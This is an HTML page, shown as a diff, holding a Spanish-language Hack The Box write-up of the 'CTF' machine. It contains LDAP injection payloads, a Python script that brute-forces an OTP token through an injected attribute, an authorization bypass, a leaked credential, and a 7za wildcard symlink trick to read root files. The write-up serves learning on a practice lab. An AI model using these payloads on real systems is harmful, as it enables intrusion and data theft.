@@ -1,0 +1,637 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB-CTF - creep33.github.io</title>
+<meta name="description" content="WriteUp con metodología de la máquina CTF.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="creep33.github.io">
+<meta property="og:title" content="HTB-CTF">
+<meta property="og:url" content="http://localhost:4000/HTB-CTF/">
+
+
+  <meta property="og:description" content="WriteUp con metodología de la máquina CTF.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/WriteUps/CTF.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-12-15T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/HTB-CTF/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "creep33",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="creep33.github.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">HTB-CTF</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="creep33" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">creep33</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cibersecurity and<br>Ethical Hacking Student
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/creep33" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB-CTF">
+    <meta itemprop="description" content="WriteUp con metodología de la máquina CTF.">
+    <meta itemprop="datePublished" content="December 15, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB-CTF
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-12-15T00:00:00+01:00">December 15, 2021 </time>&emsp;
+          
+          
+        </p>
+        <center><img src="/assets/images/WriteUps/CTF.png" /></center>
+
+<p>IP -&gt; 10.10.10.122</p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+<h2 id="nmap">Nmap</h2>
+<p>Utilizamos <a href="/Nmap/">nmap</a> y obtenemos los siguientes resultados.
+<a href="/assets/files/WriteUps/CTF.txt">CTF Nmap Result</a></p>
+
+<p>Como vemos un servicio http corriendo, lanzamos el script de nmap http-enum para enumerar posibles rutas.</p>
+
+<blockquote>
+  <p>login.php</p>
+</blockquote>
+
+<p>Encontramos un WAF porque no encontramos el servicio, esperamos un minuto a que nos quiten el ban.</p>
+
+<blockquote>
+  <p>No podemos aplicar fuerza bruta</p>
+</blockquote>
+
+<h2 id="http">http</h2>
+
+<p>En la página vemos que hablan de tokens. Y que tiene un bloqueo de 5 minutos.
+Tenemos un panel de autenticación. Vamos a probar cosas:</p>
+
+<blockquote>
+  <p>Admin:1234</p>
+</blockquote>
+
+<p>User not found. Podemos enumerar usuarios válidos. Pero probamos algunos y no conseguimos gran cosa. Probamos una inyección SQL. Pero no conseguimos hacer nada. Probamos diferentes sentencias y comprobamos que el “=” es un badchar.</p>
+
+<p>Fuzzeamos con <a href="/wfuzz/">wfuzz</a> y con el diccionario de carácteres especiales de seclists. (special-chars.txt). Probamos a utilizar esos caracteres normal y tambien encodearlo en urlencode y también double_urlencode.</p>
+
+<p>El número de palábras 233 se repite mucho asi que lo ocultamos.</p>
+
+<p>Probamos con otro diccionario de seclists (double-uri-hex.txt) que tiene más caractéres y está ya double urlencodeado.</p>
+
+<blockquote>
+  <p>Chars</p>
+  <ul>
+    <li>%2528 -&gt; (</li>
+    <li>%2529 -&gt; )</li>
+    <li>%255c -&gt; \</li>
+    <li>%252a -&gt; *</li>
+  </ul>
+</blockquote>
+
+<p>Por los tipos de carácteres que nos bloquea parece <a href="/ldap/">ldap</a>.
+Un ejemplo de como puede esta rmontado por detras puede ser:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(&amp;
+	(inputOTP-1234)
+    (inputUsername=caca)     
+)
+</code></pre></div></div>
+
+<p>Para comprobar la inyección se utiliza el byte nulo <strong>%00</strong></p>
+
+<blockquote>
+  <p>El los comentarios de la página vemos que el OTP es de 81 dígitos.</p>
+</blockquote>
+
+<p>Abrimos el burpsuite para probar cosas.</p>
+
+<p>Codificamos dos veces en url. <code class="language-plaintext highlighter-rouge">*))</code> añadiendo un byte nulo al final. Para verificar cuántos cierres de paréntesis son necesarios vamos añadiendo. <code class="language-plaintext highlighter-rouge">*)))</code>+nullbyte. Al mandar 3 paréntesis nos responde con “Cannot login”, la respuesta ha cambiado. Con la nueva información suponemos otra estructura diferente.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(&amp;
+	(&amp;
+		(inputOTP-1234)
+    	(inputUsername=caca)     
+	)
+)
+</code></pre></div></div>
+
+<p>Para sacar un nombre válido, vamos a ir probando sentencias como <code class="language-plaintext highlighter-rouge">a*)))</code>+NullByte itereando la a por cada con todas las letras. La <strong><em>l</em></strong> nos da una respuesta diferente. Seguimos iterando <code class="language-plaintext highlighter-rouge">la*)))</code> hasta conseguir el usuario.</p>
+
+<blockquote>
+  <p>User: ldapuser</p>
+</blockquote>
+
+<p>Para obtener el OTP, podemos tratar de inyectar un <strong>atributo</strong> para conseguir el <strong>token</strong>. En <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_attributes.txt">payloadallthethings</a> hay un diccionario para hacer fuerza bruta para conseguir el nombre del atributo. Probamos con la sentencia <code class="language-plaintext highlighter-rouge">ldapuser)(FUZZ=*)))</code>+NullByte, aunque también sería una sentencia válida <code class="language-plaintext highlighter-rouge">ldapuser)(FUZZ=*</code>. Urlencodeamos dos veces los caracteres especiales.</p>
+<blockquote>
+  <p>Nos encuentra unos cuantos <strong>atributos</strong> válidos.</p>
+  <ul>
+    <li>El que más nos llama la atención es “pager”.</li>
+  </ul>
+</blockquote>
+
+<p>Probamos a obtener el token con la sentencia <code class="language-plaintext highlighter-rouge">ldapuser)(pager=a*)))</code>+NullBytem, iterando la a por cada letra del abecedario. Pero todas las letras nos la detecta igual, pueden ser números, asi que probamos con un diccionario del 1-9. Nos detecta el 2 como válido, podemos seguir iterando los 81 números, o montarnos un script en python tal que:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python 
+#coding: utf-8 
+</span>
+<span class="c1"># El coding se pone cuando pueden aparecer tíldes en el código.
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
+<span class="kn">import</span> <span class="nn">pdb</span> <span class="c1"># Debugging 
+</span><span class="kn">import</span> <span class="nn">string</span> 
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span> 
+	<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[!] Saliendo...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> 
+	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> 
+
+<span class="c1"># Ctrl+C 
+</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span> 
+
+<span class="c1"># Variables globales 
+</span><span class="n">main_url</span> <span class="o">=</span> <span class="s">"http://10.10.10.122/login.php"</span> 
+<span class="n">digits</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> 
+<span class="n">attribute</span> <span class="o">=</span> <span class="s">"pager"</span> 
+
+<span class="k">def</span> <span class="nf">getToken</span><span class="p">():</span> 
+
+	<span class="n">token</span> <span class="o">=</span> <span class="s">""</span> 
+	
+	<span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Fuerza bruta"</span><span class="p">)</span> 
+	<span class="n">p1</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Iniciando proceso de fuerza bruta"</span><span class="p">)</span> 
+	
+	<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> 
+	
+	<span class="n">p2</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"TOKEN"</span><span class="p">)</span> 
+	
+	<span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">81</span><span class="p">):</span> 
+		<span class="k">for</span> <span class="n">digit</span> <span class="ow">in</span> <span class="n">digits</span><span class="p">:</span> 
+		
+			<span class="n">p1</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Probando el dígito %s en la posición [%s]"</span> <span class="o">%</span> <span class="p">(</span><span class="n">digit</span><span class="p">,</span> <span class="n">position</span><span class="p">))</span> 
+			
+			<span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span> 
+				<span class="s">'inputUsername'</span><span class="p">:</span> <span class="sa">f</span><span class="s">'ldapuser%29%28</span><span class="si">{</span><span class="n">attribute</span><span class="si">}</span><span class="s">%3d</span><span class="si">{</span><span class="n">token</span><span class="si">}{</span><span class="n">digit</span><span class="si">}</span><span class="s">%2a'</span><span class="p">,</span>
+				<span class="s">'inputOTP'</span><span class="p">:</span> <span class="s">'1234'</span> 
+			<span class="p">}</span> 
+				
+			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+			
+			<span class="k">if</span> <span class="s">'Cannot login'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+				<span class="n">token</span> <span class="o">+=</span> <span class="n">digit</span> 
+				<span class="n">p2</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> 
+				<span class="k">break</span> 
+			
+			<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> 
+			
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span> 
+
+	<span class="n">getToken</span><span class="p">()</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Token</p>
+</blockquote>
+
+<p>Como en la página pone que necesitamos un “software token”, buscamos en github algún proyecto. Compilamos uno de los que nos sale y vamos a probarlo. En el manual de la aplicación que hemos compilado vemos que hay tokens de 81 digitos llamado “Compressed Token Format” <strong>CTF</strong>. Al poner el token, nos pide un PIN, si ponemos 0000 cuenta como que no ponemos pin, vamos a suponer que no tiene PIN. Pero al probarlo no funciona, hay que cambiar la hora. Para saber la hora de la máquina podemos ver las cabeceras de respuesta HTTP.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">date</span> <span class="nt">-s</span> HH:MM:SS
+</code></pre></div></div>
+
+<p>Utilizamos otra vez el token. Hemos entrado, y tenemos un campo cmd.</p>
+
+<p>Pero al probar un comando, nos reporta que tenemos que ser root o adm, para poder ejecutar comandos. Eso explica por qué en la sentencia ldap, teníamos que cerrar 3 paréntesis. Para hacer una inyección y bypassear los grupos, realizamos una consulta tal que <code class="language-plaintext highlighter-rouge">ldapuser)))</code>+NullByte, encodeándolo todo con double_urlencode. Al iniciar sesión con ese usuario y un token válido, entramos bypasseando la validación de grupos y ahora ya podemos ejecutar comandos, nos mandamos una reverse shell.</p>
+
+<h1 id="user-pivoting">User Pivoting</h1>
+
+<h2 id="os">OS</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>login.php
+</code></pre></div></div>
+
+<blockquote>
+  <p>USER: ldapuser
+PASS: adwanonwaondiowan</p>
+</blockquote>
+
+<p>Probamos a conectarnos con ssh, y nos conectamos.</p>
+
+<blockquote>
+  <p>user.txt</p>
+</blockquote>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<h2 id="os-1">OS</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id
+sudo</span> <span class="nt">-l</span>
+<span class="nb">uname</span> <span class="nt">-a</span> 
+<span class="nb">cat</span> /etc/os-release
+</code></pre></div></div>
+
+<p>Como es un CentOS tiene una vulnerabilidad descubierta por s4vitar, relaccionada con ptrace_scope. Kali, parrotOS, CentOS, Red-Hat, son vulnerables, pero para ello tenemos que estar en el grupo sudo, y sirve cuando no dispongamos de contraseña.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /
+<span class="nb">ls
+cd </span>backup
+</code></pre></div></div>
+
+<blockquote>
+  <p>Root está haciendo un backup cada minuto, lo comprime con 7za pero utiliza una wild-card. Como el usuario apache tiene capacidad de escritura en la ruta donde lo comprime podemos aprovecharnos de crear archivos con nombres de flags para inyectar comandos en 7za. En 7za podemos utilizar archivos que empiezen con “@” para que operen con links simbólicos. Vamos a intentar que comprima el directorio /root, y ocasionar un error para que nos lo muestre en el error.log</p>
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">ldapuser</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tail</span> <span class="nt">-f</span> error.log
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">apache</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch</span> @caca
+<span class="nb">ln</span> <span class="nt">-s</span> <span class="nt">-f</span> /root/root.txt caca
+</code></pre></div></div>
+
+<p>Ademas de esta forma también podemos buscar la forma de ejecutar un comando como root.</p>
+
+<blockquote>
+  <p>root.txt</p>
+</blockquote>
+
+<hr />
+
+<p>Escrito el 15-12-2021 a las 12:16 am por creep33.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#htb" class="page__taxonomy-item" rel="tag">HTB</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#writeups" class="page__taxonomy-item" rel="tag">WriteUps</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-12-15T00:00:00+01:00">December 15, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/HTB-APT/" class="pagination--pager" title="HTB-APT
+">Previous</a>
+    
+    
+      <a href="/HTB-Chainsaw/" class="pagination--pager" title="HTB-Chainsaw
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 creep33</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
